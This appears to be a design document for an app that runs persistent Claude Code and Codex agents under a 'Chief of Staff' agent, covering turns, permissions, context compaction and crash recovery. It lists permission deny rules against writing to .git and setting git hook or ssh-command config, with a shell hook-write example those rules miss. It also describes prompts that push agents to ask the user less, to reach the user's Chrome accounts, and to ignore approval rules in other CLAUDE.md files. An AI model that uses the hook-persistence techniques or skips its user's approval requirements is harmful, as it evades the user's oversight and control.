# Agents

Persistent, named agents you chat with, the way Grok Bot works on desktop, but
every agent is a Claude Code session on your own Mac. One of them, the **Chief
of Staff**, manages the rest: it creates agents, briefs them, delegates to them,
keeps track of what they're doing, and deletes them when you say so. You can
talk only to the Chief and let it run everything else.

Agents is a mode, not a page. The **Agents | Projects** toggle at the top of
the sidebar (⌘⇧A, or ⌘K → Switch to Agents) turns the whole window into the
chat app: agent list on the left, one conversation on the right. Switching
back returns to wherever you were on the Projects side (the dashboard,
Workflows, the Inbox, or the open project); switching in returns to the last
conversation. While Projects is showing, an amber badge on the
Agents segment says an agent needs your OK or has news, and its tooltip says
which. New agent is ⌘N, the row at the foot of the agent list, or ⌘K. In the
collapsed rail the toggle is two stacked icons; below the compact breakpoint
it is an icon pair at the top bar's leading edge.

Agents is the primary view: the app opens on it (a project window opens its
workspace instead), and onboarding ends there. A new Chief's chat opens on its
greeting, `prompts::CHIEF_GREETING`, appended by `ensure_main` when it creates
the Chief: what it can do (create agents, delegate, approvals, projects, the
phone) and a question. It is stored, not generated, so nothing runs on the
user's plan until they reply, and `CHIEF_INSTRUCTIONS` tells the Chief it said
it. Three starters sit under it until the user's first message (see "A
first real result", below); while the greeting is all there is, it and the
starters sit in the middle of the page as an empty state (`data-greeting` on
the message column), not at the foot of an empty screen.

In Agents mode the sidebar's top row is the toggle (Home, Workflows and the
Inbox belong to the Projects side). **What's in flight** — the one name for
the cross-agent overview — is reached from a **"Needs you · N"** row at the
top of the agent list, shown only while an agent waits on you (a request, or a
turn that didn't finish; the same set ⌘J visits), and from ⌘K. A usage limit
is not waiting on you — it resets by itself — so it isn't counted: What's in
flight lists it under **Paused**, and in a chat it is a quiet centred line
with "Retry at 4:45 AM" (and a quiet "Try anyway", since the limit may have
lifted early), not a tinted box. There is no
icon for it: an unlabeled one was three names for one place. Its foot has the Phone row (the companion
app: pair, or which phone is connected); remote access, for driving the app
from another assistant, appears there only while it is on and is otherwise
reached from the Phone panel's last line or ⌘K. In a project's workspace
sidebar, agents bound to that project are listed above its terminal
Sessions; clicking one opens its chat.

## A first real result, and ready-made agents (`agents/templates.rs`)

The people this is for already run an assistant; what they can't get there is
work that keeps going without them. So the Chief's greeting starts on
pipelines, not one-offs: something starts it (a time, a file, an email, a
GitHub issue), agents hand the work between them, and it ends on a card the
user answers, on the desk or the phone. Three starters and **More ideas…**,
from one catalogue (`lib/chiefIdeas.ts`). Each types a whole, specific brief
with one blank at its end; none sends by itself.

The chips are **Brief me every morning…**, **Run an inbox triage crew…** and
**Run my launch as a team…**: one per group, recognisable to someone who
isn't a developer, and two of them need nothing set up, so the first result
can land in the first minutes (the morning brief asks for its first one
now). Ship fixes and client briefs were chips until a first-ten-minutes
walk-through found them making the first screen read as a coding tool that
asks for GitHub before showing anything; they are in the gallery.

- **Brief me every morning…**: a researcher reads what's new on the topics
  the user names and a writer boils it down to one short brief, every
  weekday at 8am, the first one right away. Needs nothing set up.
- **Ship fixes while I sleep…** (gallery): every night a fixer bound to the repo's
  project takes the top open GitHub issue and fixes it in its own copy, a
  reviewer checks it (`message_agent`), and the morning brings one change
  card with Keep / Review / Discard. Pushing waits for the user.
- **Run my launch as a team…**: a strategist, a writer and a builder, the
  Chief keeping the plan in a file, and a 9am weekday standup it collects
  and summarises. The Chief puts the three and itself in a room
  (`create_room`, see "Rooms"), so the user talks to the whole team at once.
- **Turn client briefs into sites…** (gallery): `watch_for` `new_file` on a folder;
  each brief becomes a project (`blank` needs nothing installed) whose
  session drafts the site, handed back with `share_result` naming the
  project.
- **More ideas…** opens the gallery (`ChiefIdeasModal`, also ⌘K → "Ideas for
  your team…"), grouped On a schedule / When something happens / Agents
  together: watch competitors weekly (researcher + analyst, one brief), babysit
  errors hourly (reproduce, fix in a copy, a card to keep; one line when
  nothing broke, since a routine always leaves its line), an inbox triage
  crew (sorter + drafter through the user's email app; sending is always an
  Allow card), and two agents arguing it out. Its foot links Ready-made
  agents and the Phone panel.

**Setup is step one, never a dead end.** An idea may need what this Mac
doesn't have (GitHub signed in, the repo as a project, an email app, a
folder, a paired phone). The gallery line says so ("Your Chief helps you
connect GitHub first"), and `CHIEF_INSTRUCTIONS` has the Chief walk the user
through it in the chat, naming the real places (⌘K → Connect GitHub account,
Projects → Import from GitHub, ⌘K → Connect an app for agents…, ⌘K → Pair a
phone), checking each step before the next. Then the team, then the trigger
(said to run only while the app is open and the Mac awake), then **the first
run now**, while the user is there to choose Always allow for what it will
repeat unattended (a 1am run can't wait for an Allow). Always allow is never
suggested for sending, spending, pushing or anything reaching a client.

**A site comes back on a card, not by moving the window.** `share_result`
takes an optional `project` (a name from `project_list`, resolved against the
real list and refused if unknown), stored on the card as its path; the card
offers **Preview**, which opens the project only when pressed. A revision
keeps the project. The Chief is told not to call `project_open` (which takes
over the window) unless asked. When the turn also left a change card (a
project with git), the result rides on it and that card's own Preview is the
one shown.

The set is fixed, not rotated: two people comparing notes, and a screenshot
and the app, should see the same first screen.

**Existing Chiefs get the new instructions** (`agents::upgrade_chief`, on
every look-up of the Chief, one read when there's nothing to do). Every
earlier default is kept word for word in `prompts::PAST_CHIEF_INSTRUCTIONS`
(add the old text there whenever `CHIEF_INSTRUCTIONS` changes). If one is
found intact in the Chief's `## Instructions`, only it is swapped for the
current text: what the user added around it (or a `### From Ship Studio`
merge) stays, and `write_instructions` keeps the role, heading and `##
Memory`. Instructions the user rewrote (no old default left intact) are
theirs and are never touched or appended to: new guidance tacked onto rules
someone chose could contradict them. The Ship Studio Chief merge also skips
any past default, so stale guidance isn't merged in as the user's.

Research runs on the engine's own tools and account. On
Claude Code every web search and every page opened is a tool call the
approval broker asks about, so a first research turn can raise several
Allow cards. The Chief and the Research assistant are told to say so
before they start ("I'll ask before searching the web"), and a search's
card offers **Always allow web searches** (a `Tool` rule on `WebSearch`,
`permissions::suggest`); a page's card offers its one host, so each new
site still asks once. On Codex, web search is Codex's own built-in tool
(seen as `webSearch` items): it doesn't come through the broker, so it
runs without a card. There is no WebFetch on Codex; a command that
reaches the network is sandboxed and asks to escalate, with a card.
Whether a user's Codex has web search turned on (and live or cached) is
Codex's own setting, which the app doesn't read, so Research there may
find it can't search and says so, per its briefing. The briefings tell a
Codex agent not to promise cards it won't raise. Not verified: a live
Codex research turn.

A prompts.rs test holds each line of `CHIEF_INSTRUCTIONS` the ideas lean on.
Not verified: any of the pipelines on a live engine end to end (a night's
fix, a reviewer hand-off, a triggered site), and whether a routine turn at
1am stalls on an Allow the first run didn't cover.

**Ready-made agents** (role templates) are one catalogue,
`src-tauri/src/agents/templates.json`: Research assistant, Inbox triage and
Weekly review, each a name, role, colour, briefing and its own starters. The
backend reads it (`templates.rs`) and the desktop imports the same file
(`lib/agentTemplates.ts`), so what the dialog shows is what the agent gets.

- **The Chief** sees a "Ready-made agents" section in its prompt
  (`templates::chief_section`) and creates one with `create_agent`'s
  `template`: the template brings the role, briefing and colour; `role` and
  `color` override, and `instructions` is *added* under "About the user",
  never instead of the briefing. Only `name` is required.
- **New agent** starts with "Start from" (Blank and each template, a
  `SegmentedControl`). Picking one fills in the name, role and briefing, all
  editable; switching replaces only fields still showing the last template's
  words. ⌘K has one "New agent: <title>…" per template
  (`agents.template.<id>`).
- **The agent** records `template` (registry field, omitted when none). Its
  first open shows the template's starters instead of the generic ones, also
  when the Chief made it and its chat holds only "Created by" notes.
- **Inline connect, only where honest.** Only Inbox needs anything (`needs:
  "mail"`): it reads email through an app the user connects. The dialog and
  the agent's first open say so in one line ("It reads your email through an
  app you connect, such as Gmail.") with **Connect an app…** opening Apps
  (Claude Code agents; on Codex the line says to connect it in Codex). Nothing
  claims an app is or isn't connected: the engine lists its apps only once a
  turn starts. The briefing tells the agent to check, say so in one line and
  stop if it has none, and never invent a message.
- **Phone**: `agents.templates` (read-only; a Mac that serves it accepts
  `template` on `agents.create`) lists them without briefings; New agent shows
  "Start from" chips and the Mac fills in the briefing. The phone's Chief chat
  has no starters, and apps are connected on the Mac.

Not verified: a real turn on each template (briefing quality is untested
against live models; `scripts/agents-e2e.sh behaviour` doesn't cover it yet),
and Inbox against a live Gmail connector.

### Describe the agent you want (`agents/draft.rs`)

The New agent dialog opens on one field, **Describe the agent you want**,
with a specific example as its placeholder (⌘K → "Describe a new agent…"
opens it too). **Draft it** (or ⌘Enter there) asks the engine new agents
start on for the whole agent (`agents_draft`): a name, a colour, a one-line
role, a briefing, up to four routines and the apps it will need. The draft
fills the dialog's own fields, all editable, and adds one review list,
**Routines**, each ticked; Create makes the agent with the routines still
ticked (`agents_create`'s `routines`). "Start over" puts the one prompt back.
Nothing is made before Create.

- **One sealed call, no tools.** Claude Code with `--tools ""`, no MCP
  servers, `--setting-sources ""`, no slash commands, no session kept, in the
  temp folder; Codex in `exec --sandbox read-only`. The description is fenced
  and called data in the prompt; the answer is parsed as the last JSON object
  and checked field by field (name ≤ 40, one-line role, a colour the app draws
  and nobody wears, else the first free one).
- **Only what the app can stand behind.** Each routine's `when` is read by
  the routine grammar (`schedule::check`) and shown as it read it ("Every
  Friday at 16:00"); one it can't read comes back with `problem`, shown, and
  can't be ticked: never guessed into a time. Steps are checked as a
  routine's steps; the draft is told to split "draft, then post" into two,
  the second `askFirst`. Apps are named only as what it will ask for ("Uses
  Slack. It asks you to connect it the first time it needs it."), never as
  connected. Each routine that can't be set at Create leaves a line in the
  new agent's chat saying which and why.
- **The Chief does the same in chat.** `create_agent`'s description: an agent described
  in one message is drafted in one short reply (name, role, briefing,
  routines with times, the apps) with "Make it?"; on yes, one `create_agent`
  with `routines`.
- **Phone.** On a Mac listing `MAC_FEATURES.draft` (`agents.draft`), "What
  should it do?" takes a sentence or two and **Draft the rest** asks the Mac;
  the draft fills the name and colour, and a review below ("What it knows",
  editable; Routines with a switch each; the apps line) feeds
  `agents.create`'s `instructions` and `routines`. A draft counts toward the
  phone's new-agent limit, since it spends the user's plan.

The idea (one prompt, a reviewed draft, then save) is OpenBot's
(openbot.run, studied from its README and docs only, PolyForm Noncommercial:
no code, copy or assets taken); the design, the grammar check, the sealed
call and the review are this app's.

Not verified: drafting against a live Claude Code or Codex account (the
prompt, the parse and the review are unit-tested on recorded shapes).

## What an agent is

| Piece | Where | Notes |
| --- | --- | --- |
| Identity | `<projects root>/.shipstudio/agents/agents.json` | name, role, colour key, `avatar` (a shape and a face; absent, derived from the id: see docs/internal/avatars.md), pinned/hidden, unread, Claude session id |
| Home | `<projects root>/.shipstudio/agents/<id>/` | the agent's working directory |
| Instructions + memory | `<home>/CLAUDE.md` | Claude Code loads it every turn. Instructions on top, `## Memory` below, which the agent maintains itself. Editing instructions never touches memory. |
| Conversation | `<home>/messages.jsonl` | what *you* were shown: your messages, its replies, agent-to-agent lines, approval cards, errors. Append-only |
| Card answers | `<home>/approvals.jsonl` | one line per answered approval card, applied over the card on read (answering never rewrites the log) |
| In flight | `<home>/turn.json`, `<home>/inbox.json` | the turn running now, and what is queued behind it; both survive a quit |

The chat log is ours, not Claude Code's transcript. The UI never reconstructs a
conversation from tool output it doesn't own (see "Never Assume Data").

## How a turn runs (`src-tauri/src/agents/runner.rs`)

Each agent has an inbox. A message from you or from another agent is queued; if
the agent is idle a worker drains the inbox, so everything that arrived while it
was busy becomes **one** next turn. A turn is one process:

```
claude --print --output-format stream-json --verbose --include-partial-messages
       --session-id <uuid> | --resume <uuid>
       --permission-mode acceptEdits
       --permission-prompt-tool mcp__app__approve
       --mcp-config <app support>/agent-bridge/mcp-<random>.json   (0600; see below)
       --allowedTools mcp__app
       --append-system-prompt <voice + role + team rules>
       --add-dir <projects root> --add-dir <each external project>
       --disallowedTools 'Edit(**/.git/**)' 'Edit(**/.shipstudio/**)'
                         'Edit(/<each added dir>/**/.git/**)' …
                         'Bash(git config core.hooksPath:*)' …
cwd = the agent's home, prompt on stdin, MCP_TOOL_TIMEOUT raised (see below)
```

**What a turn may write.** Its cwd and every `--add-dir` (the whole projects
root and every external project — not only a bound agent's own project;
narrowing that to the bound project is a product decision still open), minus
any `.git` or `.shipstudio` folder anywhere in them. Claude Code gets that as
deny rules: relative ones for its cwd and absolute `//` ones per added folder,
because a relative rule doesn't reach an `--add-dir` (verified on 2.1.318: a
Write into each is refused "denied by your permission settings", including in
an added folder whose path has a space and a comma). The rules cover the file
tools. For the shell there are also `Bash` deny rules for persisting the git
settings that make a later `git` run execute a program (`core.hooksPath`,
`core.fsmonitor`, `core.sshCommand`, in every `git config` scope); a deny wins
over any allow in the user's own settings. Those are prefix rules, so other
ways of writing into `.git` from a shell (`echo … > .git/hooks/x`, `cp`, an
interpreter, `git -C dir config …`) aren't matched; they aren't silent either,
since in `acceptEdits` every shell command asks through `approve` unless the
user's settings allow it. Treat all of this as defence in depth, not a
sandbox. Codex gets the same as a permissions profile (below). The copy-per-task commit is made by the app at the end of the
turn, never by the agent (`task`).

There is no long-lived process per agent, so twenty idle agents cost nothing.
The user's own Claude Code MCP servers and settings still load, which is how an
agent reaches Gmail, Calendar, Slack or anything else you've connected.

From the stream:

- every **top-level text block** streams: its text deltas (`stream_event`)
  build a draft sent as `agents://draft {agentId, id, text-so-far}` at most
  every 40ms, and the complete block is recorded under the draft's id, so the
  finished message takes over the same bubble (`agents/stream.rs`, tested on a
  captured real stream). Sub-agent text, streamed or not, is internal and is
  dropped. Stop mid-reply keeps what streamed, as a message marked `stopped`;
- on the desk the store applies draft and status events once per frame (the
  newest per agent), the reply is revealed at the display's pace as on the
  phone (`useReveal`: whatever is queued over ~260ms, never under 45
  characters a second; the finished message carries on from where its draft
  had got to), and only the block being written is re-parsed and redrawn
  (`createStreamingSegments`, `ProseRun` in `AgentProse.tsx`);
- while words are arriving the typing dots are hidden; they and the activity
  line come back between text blocks, while tools run, once the gap has
  lasted 0.7s (a blink of them between two blocks read as a flash);
- every **tool call** only updates the line under the agent's name ("Editing
  PricingTable.tsx", "Messaging Finance"); it never becomes a message;
- `system/init` confirms the session id, which is stored for the next `--resume`,
  and is checked against what we assume (`agents/broker.rs`, see Approvals):
  the permission mode it really runs in and whether our own MCP server started;
- an `is_error` result, or any exit without a `result` event (a crash, or
  output that wasn't stream-json, even with exit code 0), becomes an error
  line; a crash keeps what had streamed, marked `stopped`. `agents/failure.rs` words the two states people actually hit in
  Agents' own terms and tags the line (`failure`): "Claude Code's usage limit
  is reached. It resets at 3:00 PM." (`usage_limit`, with `resetsAt` only when
  Claude Code printed an epoch, or a clock time in this Mac's zone; a time in
  another zone is quoted, never converted) and "Claude Code is signed out."
  (`signed_out`). Anything else is shown as it came. The agent's registry entry
  carries the tag while the error is the newest line (`Agent.failure`, cleared
  by anything said after it), so the sidebar shows "<reason> · didn't finish"
  (the reason first, over up to two lines) with a red dot, or "Usage limit ·
  resets 3:00 PM" quietly with no dot at all (amber means needs you, only), and
  What's in flight lists it under Needs you with its remedy.

**A conversation survives its engine's copy.** After every turn the app keeps
its own 0600 copy of the agent's current transcript in `<home>/.session/`
(`agents/transcript.rs`; only the current conversation's), and before a resume
it puts the most complete copy it has (the longest, then the newest: transcripts
only grow) where the engine will look: the account folder the turn runs with
and, for Claude Code, the folder of the directory it runs in
(`projects/<cwd with every non-alphanumeric as ->`), so another account, a
bound agent's new copy of its project, or a deleted `~/.claude/projects` (seen
on 2026-11-06: 62 "is gone" restarts in a day, none of those transcripts left
on disk, no account switch and no change of folder) no longer start it blank.
A pick-up after a restart counts the app's copy as on disk.

A vanished session (`--resume` → "No conversation found") is replaced once with
a fresh one, only when the engine never started the conversation (its errors
can mention an MCP server's "session not found"). The new one gets a recap
(`with_recap`): the newest ~30 exchanges or ~6k tokens of the visible chat
since the last fresh start, each message up to 2,000 characters, the agent's
own reports, errors shown to the user and its approval cards included, then
what is still open (cards waiting, questions unanswered), and it is told never
to ask the user to repeat any of it; `search_my_chat` reaches further back.

**Do it, don't ask.** Every agent's prompt (`prompts::AGENCY`) has it look
before asking (`search_my_chat` over its own chat, a teammate's, or with
`agent: "team"` every agent's chat and memory at once, for the Chief, admins
and at Bold; memory; logs; its tools; then the user's own accounts and
assistants in their Chrome: Gmail, X, Grok), asks the Chief to search the
team when it isn't the Chief, and only then asks the user, one question, with
its own pick and why when the choice is really theirs. It never treats
"I have no X tool" as an answer while the access chain has a browser left,
never pre-declines a send (the app raises the card), and answers "is it good?"
with an end-to-end check and proof. A reply that gives up anyway ("I have no
Slack tool", "they'd need to say yes", a tool name in the user's chat) earns a
hidden note at the start of its next turn in its own chat (`agents/agency.rs`,
beside `share_text`'s): nothing shown, nothing re-run on its own. At Bold
and Unleashed a needless question gets one too ("Want me to…?", "Should I
file those too?", "or would you rather send them yourself?"), unless it is
about the floor (money, credentials, deleting for good, production or main,
or exact text the user wants to see). The level's own section says the same
(`independence::NO_ASKING`): a yes they gave covers every step, a rule they
set ends when they lift it, and a CLAUDE.md written for their other tools
(Claude Code loads `~/.claude/CLAUDE.md` into every turn) adds no asks.

**Promises kept** (`agents/follow_up.rs`). A reply that ends on an explicit
commitment to act now or next ("I'll check Slack for that thread next", "Let
me run the audit") with no tool call after it, and nothing it waits on (no
`message_agent` this turn, no check-in it scheduled, no open card), gets a
**follow-up**: a one-time check-in a minute out, marked `followUp`, under
"Scheduled next" in What's in flight as "Said it would: “…”". It fires like
any check-in (retries, quiet hours, take-over) with a wake that quotes the
reply and says to do it now, or answer `[nothing new]` if done or no longer
wanted. Not a promise: a question, anything waiting on someone else ("once
you send it", "when Finance replies"), a stated later time (that's
`schedule_check_in`), "I'll let you know". Bounded: only after a turn that
answered the user or an agent's reply in the agent's own chat (never a
routine's, check-in's or follow-up's own turn, a room, outside text, or a
request it owes another agent), one waiting per agent, three a day. The user
writing first folds it into their turn as a hidden note. "Save my limits":
nothing runs on its own; a quiet line says so and the next turn is told.
Observed: a Slack check promised one evening hadn't started the next day.

**"Can't" checked against what the app knows** (`agents/team_reach.rs`).
`who_can_reach` answers, for the caller and then the team, from the app's
own facts: connectors the engine listed at the agent's last turn, connections
granted to it, and whether its turns get the user's Chrome or the agents'
browser for the service's site. A reply saying "I can't read Gmail" (first
person or the team's, about reading or reaching a service the catalogue
knows) while any of those says otherwise gets the same follow-up, naming who
can ("Said “…”, but the app knows a way in: Inbox: the Gmail connector…"), so
the agent corrects it by doing it or handing it over. "What you can do here"
says a missing line isn't "can't". Observed: the Chief said it couldn't read
Gmail while another agent was reading it.

**Stop** ends the turn and drops the queue; it leaves a quiet
"Stopped" note (your doing, not a failure). A turn is capped at 3 hours.

**Start fresh, keep memory.** The agent menu, ⌘K and the phone's agent sheet
offer "Start fresh" (`agents_start_fresh` / `agents.startFresh`): the next
message begins a new conversation on the same engine, through the same path an
engine switch takes. Instructions and `## Memory` carry over; the session
doesn't, and nothing is recapped into the new one. The chat stays, with a
"Started fresh · memory kept" note (`fresh: true`) drawn as a divider. It's
refused while the agent is working, while a card in its chat waits on an
answer, while another agent still owes it the answer to something it delegated
(that answer would land in a conversation that never asked), and when its next
message already starts a new conversation. The check and the reset happen under
the inbox lock, so a message sent at the same moment either starts first (and
the fresh start is refused) or starts in the new conversation; two at once
record one divider. Any later recap (an engine switch, a vanished session) only
carries what came after the last divider. The prompts tell agents this can
happen, so anything they'll need later belongs in memory.

**Context meter.** `agents/context.rs` stores one reading per agent
(`Agent.context`: `used`, `window`, the engine's `model` id) from the engine's
own numbers: Claude Code's last `assistant` `message.usage` against the
`result` event's `modelUsage[*].contextWindow`, and Codex app-server's
`thread/tokenUsage/updated` (`last` against `modelContextWindow`, less
`reasoningOutputTokens`, which the next request doesn't carry — as Codex's own
`tokens_in_context_window` counts it; Codex's "% left" also sets aside a fixed
allowance, so it can read a point or two lower). `codex exec`
reports no window, so it gives no reading, and the UI shows nothing; nothing is
ever estimated. The editor shows "72% full · 144k of 200k tokens"; from 85% the
chat suggests starting fresh. A turn on the agent's own model replaces the
reading, or clears it when it gives none (stopped, timed out, an old Claude Code
without `modelUsage`, a `codex exec` fallback, a vanished-session retry); a
routine on another model (check-ins default to Haiku) leaves it alone, since
that model's window isn't the conversation's. A fresh start, an engine switch
or a model change clears it.

### Keeping context healthy (`src-tauri/src/agents/tidy.rs`)

Two layers, both engines. **Every turn** has the engine's own compaction on
and tuned, so nothing in the user's config can leave an agent to run into
the wall mid-task. **Between turns** the app tidies a conversation that has
grown past 70% of its window or 200k tokens, whichever comes first, at a
moment nothing else needs the agent.

*Every turn.* Claude Code gets `--settings '{"autoCompactEnabled":true}'`
(command-line settings outrank the user's files), `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=85`
(it can only lower the threshold), and this app's own `DISABLE_AUTO_COMPACT`
/ `DISABLE_COMPACT` are removed from the turn's environment. Codex gets
`-c compact_prompt=…` (our summary instructions) and, once a reading has
named the model's window, `-c model_auto_compact_token_limit=<85% of it>`;
on its first turn, Codex's own default threshold. These also reach a
take-over (its command line is the turn's).

*Between turns* (`runner::maybe_tidy`). After a turn that **finished**, with
nothing queued, no card waiting on the user, not taken over, not a turn
answering outside text (it can't write its memory), and not a bound agent
with no copy open (its turn would run in the user's own folder), when the
reading is ≥ 70% of the window or ≥ 200k tokens (`tidy::TIDY_PERCENT`,
`tidy::TIDY_TOKENS`): two quiet turns in the same conversation, whose words never
reach the chat (`tidy::QuietTurn`; no drafts, no bubbles, no vanished-session
retry, no "Interrupted" note):

1. **Memory first.** An app-owned prompt (`tidy::memory_prompt`) asks the
   agent to update `## Memory` in its CLAUDE.md with durable facts, and to
   keep exactly one `In progress:` line (task, where it stands, open asks,
   files, branches, links) while work is unfinished, replacing any earlier one.
2. **Compact**, with `tidy::KEEP` as the instructions (the task in progress,
   decisions, open asks, every file/branch/PR/URL/project touched, and the
   memory pointer): `/compact <KEEP>` as a `--print --resume` prompt on Claude
   Code; `thread/compact/start` on Codex's app-server, which ends on its
   `contextCompaction` item. The reading is cleared (the engine reports the
   next one).
3. **Fallback.** On `codex exec` (no way to compact a thread), or when the
   engine didn't report a compaction, the next message starts a fresh
   conversation instead, through the same checks as Start fresh, with memory
   (step 1) as the hand-off.

Either way the chat gets one quiet line, "Tidied this conversation's memory —
nothing lost" (a divider when it started fresh). Anything sent meanwhile
waits like any message during a turn; a tidy gives way to it between its two
steps, and Stop stops it. Its tokens are the agent's, never a routine's.

*The system prompt* tells every agent the same, in one paragraph: what is
sure to carry over, drop `In progress:` when done, put big output (logs,
command output, page dumps, data) in a file and read back only what's
needed, and what any summary keeps. It is held to a budget
(`runner/prompt_budget_tests.rs`): a plain agent's app-owned prompt is 12,054
characters, a Codex agent's 12,619, the Chief's 16,003 before its team list
(budgets 12,500 / 13,100 / 16,600). The agents' browser in "Getting access"
took them to 12,697 / 13,262 / 16,646 after trims elsewhere (the repeated
"don't mention servers or ports", the password paragraph the Secrets section
already says), and the budgets to 12,800 / 13,400 / 16,800, then 13,100 / 13,700 / 17,100 for running projects from chat, and 13,250 / 13,850 / 17,250 for remembered permissions and reading artifacts. Grok, the team-wide search and the Chief's tone rules went in within those budgets (13,209 / 13,794 / 17,246) by trimming the rooms, import and agent-editing bullets, "Look before you scale" and a dev-server line. The bulk-work cleanup line (`disk`) went in within them too (13,211 / 13,796 / 17,248), by trimming "Showing your work" and the plumbing example. The Chief's draft-first line ("Asked to make one? Draft it in one reply ending “Make it?”") went in within the Chief’s (17,245 of 17,250) by trimming its delegate, `project` and `read_agent` bullets: live on Haiku, the tool description alone didn't hold against "do it, don't ask", and a first message asking for an agent was built at once. Measured with Claude Code (Haiku 5.5,
`--append-system-prompt-file`, input tokens over a bare run): on the base
this work started from, 3,347 tokens before and 3,269 after for a plain agent
(4,583 → 4,505 for the Chief), while gaining the paragraph above; with
"Showing your work" and "Plumbing stays out of the chat", added on the
foundation meanwhile, 3,827 (Chief 5,063). Trimmed: the logins rules' repeat
of the secrets rules, the Chrome profiles sentence, the team brief, and a
duplicate push rule; "Ship Studio" in two engine lines became "the app".

**Observed vs assumed** (docs fetched 2026-11-05; Claude Code 2.1.318 and
Codex 0.166 on this Mac):

- Observed: `/compact <instructions>` as the prompt of `claude --print
  --resume` compacts (a `system/status` "compacting", then
  `system/compact_boundary` with `compact_metadata.trigger: "manual"`,
  `pre_tokens` 29,470 → `post_tokens` 9,602, and a `result` with no
  `assistant` event); the summary kept the fictional project and its open
  ask. `--settings` with `autoCompactEnabled` is accepted.
- Observed (`claude --help`): `--system-prompt-snapshot` is on by default:
  the system prompt (ours included) is recorded on a conversation's first
  request and reused verbatim on every resume **until it is compacted**. So a
  changed policy, level or (for a bound agent) memory reaches an old
  conversation only after a compaction or a fresh start; the tidy is also
  what refreshes it. The bound agent's memory section now says it may be
  older than the file.
- Documented ([context-window](https://code.claude.com/docs/en/context-window.md),
  [memory](https://code.claude.com/docs/en/memory.md)): after compaction the
  system prompt still applies and the project-root CLAUDE.md is re-read from
  disk (an unbound agent's home is its cwd). `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE`,
  `DISABLE_AUTO_COMPACT`, `DISABLE_COMPACT`
  ([env-vars](https://code.claude.com/docs/en/env-vars.md));
  `autoCompactEnabled` is a settings.json key
  ([settings-reference](https://code.claude.com/docs/en/settings-reference.md));
  native-1M models auto-compact at about 967K by default
  ([model-config](https://code.claude.com/docs/en/model-config.md)); a
  PreCompact hook can block but not add instructions, and SessionStart
  `compact` re-injects context ([hooks](https://code.claude.com/docs/en/hooks.md)).
  We add no hooks: the user's own still run, and one that blocks compaction
  would block ours (the tidy then starts fresh).
- Assumed: that Claude Code's *automatic* compaction reads our system prompt's
  "any summary keeps…" line (the system prompt applies, but the summariser's
  own prompt isn't documented); that auto-compaction runs in `--print` as
  interactively (docs imply it, not observed: no agent has come near it).
- Codex, from 0.166's own schema (`codex app-server generate-json-schema`):
  `thread/compact/start {threadId}`, a `contextCompaction` thread item, the
  deprecated `thread/compacted` notification, and config keys
  `compact_prompt`, `model_auto_compact_token_limit` and its `_scope`. **Not
  observed live** (no Codex account on this Mac): the order of notifications
  after `thread/compact/start`, whether `compact_prompt` applies when OpenAI
  compacts remotely, and Codex's default threshold when no limit is set.
  A compaction that never reports ends with the turn and falls back to a fresh
  start.
- Real readings on this Mac (read-only, 2026-11-05): fifteen Claude agents on
  Opus 5.5 with 1M windows, 3–9% full. At 70% of 1M a conversation would be
  ~700k tokens re-read on every resume, which is why the 200k cap tidies
  first on large windows.

**Process trees.** Each turn's `claude` leads its own process group
(`agents::procs`). Stop, interrupt, the timeout and quitting walk its process
tree first (a backgrounded child that called `setsid` has left the group but
is still a descendant), then signal the group and every descendant: SIGTERM,
then SIGKILL after 1.5s. A dev server or watcher its Bash tool started dies
with it. Once `claude` closes its output, its exit and stderr are waited on
for at most 10s; once its result is in, for a few seconds, then whatever it
left running in the background is stopped too.

**Slots.** One turn per 2 GB of RAM may run at once, never fewer than 3 or
more than 16 (`agents/capacity.rs`; 16 on a 32 GB Mac, 4 on an 8 GB one). An
agent past that shows "Waiting for a free slot (N agents already working)"
with the real N, can be stopped while it waits, and picks up whatever else
arrived meanwhile when its slot frees. On a machine with 12 GB or less, a
turn also waits while the kernel's free-memory figure is under 1 GB and
another turn is running ("Waiting for free memory (1 agent already
working)"); a lone turn always runs.

**Quitting mid-turn.** A turn writes `<home>/turn.json` (pid, session, and
for a bound agent the project snapshot taken before it) while it runs. On
quit, `RunEvent::Exit` calls `runner::shutdown_sync`, which stops every
turn's process tree and leaves the marks in place. A crash or force quit runs
no cleanup at all, so at launch `runner::recover_after_restart` also stops a
leftover process (if its command line still names the session), removes the
mark, records the turn's change card if it changed the project, and picks
the turn up (see "Durable turns" below). The
messages queued behind it (`inbox.json`) are then sent once, after a note
naming them. What the last run
left is noted synchronously at launch (`runner::prepare_recovery`, before
anything can start a turn): those messages go back on the queue (and stay on
disk), and those agents' turns wait until recovery has dealt with them, so a
turn started in this run is never mistaken for a leftover and nothing is
sent twice. The mark is written *before* a batch leaves the queue, so there
is no moment a quit leaves neither. An update's restart waits for working
agents ("After agents finish"; click again to restart now).

**Durable turns.** A restart, a crash or the engine dying never wipes out a
turn. The mark (written by rename, redacted, under one lock) holds what a
pick-up needs: the messages the turn took (`took`, so the same people are
answered and a sealed "When…" turn stays sealed), the engine conversation
(`session_id`: Claude Code's id from spawn, a new Codex thread's once it
says), how many pick-ups it had (`resumes`), whether the user pressed Stop
(`stopped`), and its progress, saved at most once a second while it changes
(`progress`: the reply streaming now and the timeline so far; finished
replies are already in the log). At launch `runner::plan_recovery` keeps the
streamed reply under its draft's id (cut off), and then either:
- **picks it up**: a quiet "Picked up after the app restarted" line (the
  timeline hangs under it) and a turn queued first that resumes the same
  session, told only to carry on and not redo finished steps
  (`prompts::carry_on`); or
- **leaves it for you**: an error line tagged `failure: interrupted` with
  **Continue** (desk and phone), which sends "Continue" in the same
  conversation. Never Retry: sending the request again could do it twice.

It is left for you when the user was driving it by hand (take-over), when it
answered in a room, when it already had its one pick-up (`MAX_RESUMES`), or
when its conversation isn't on disk in any of the engine's account folders
(`wallet::session_on_disk`) or the agent has moved to another since: a pick-up
never starts blank. A turn the user stopped as the app went ends on
"Stopped". The same holds while the app runs: an engine whose process ends
mid-turn, in a session it confirmed, for no reason that needs the user
(`runner::died_mid_turn`), is picked up once in place ("Picked up after
Claude Code stopped unexpectedly", same timeline, no fresh-session retry);
dying again ends on the interrupted line. A pick-up that finds its session
gone ends there too, rather than retrying fresh.

**Nothing goes silent.** A worker that panics mid-turn resets the agent
(idle, slot freed, an error line saying the turn didn't finish) instead of
leaving it "working" forever. The panic is caught (`catch_unwind`) and
handled as a failed turn; a guard that fires while unwinding only resets
in-memory state, so a second panic in that handling ends one task, never the
app. Word to delegators keeps the dead turn's hop (and the 6-hop cap), and a
worker that died before taking anything tells the agents whose requests it
dropped. Recovery at launch can't hold turns forever either: each agent is
